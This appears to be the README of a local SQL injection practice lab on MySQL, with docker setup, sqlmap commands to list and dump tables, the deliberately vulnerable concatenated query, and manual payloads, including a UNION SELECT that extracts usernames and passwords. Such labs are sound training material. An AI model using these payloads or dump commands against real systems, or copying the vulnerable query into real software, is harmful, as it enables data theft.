# sqli-mysql — full sqlmap practice (MySQL)

A separate SQLi target on MySQL, so sqlmap can fully dump tables, columns, and
data. The SQLite endpoint in BAC-Labs can only be detected and list tables;
SQLite column/dump enumeration does not work in sqlmap.

## Run

```bash
docker compose up --build
```

- App: http://localhost:3005
- MySQL: localhost:3306 (root / root, database `shop`)

## sqlmap

```bash
# list tables
sqlmap -u "http://localhost:3005/search?q=laptop" --dbms=mysql --batch --tables

# list columns of a table
sqlmap -u "http://localhost:3005/search?q=laptop" --dbms=mysql --batch --columns -T secrets

# dump a table
sqlmap -u "http://localhost:3005/search?q=laptop" --dbms=mysql --batch --dump -T secrets
```

The vulnerable query is `SELECT id, name, price FROM products WHERE name LIKE '%<q>%'`
(no auth, string concatenation into MySQL).

## Manual payloads

- `' OR '1'='1` — returns all products
- `' UNION SELECT 1, username, password FROM users--` — dumps users
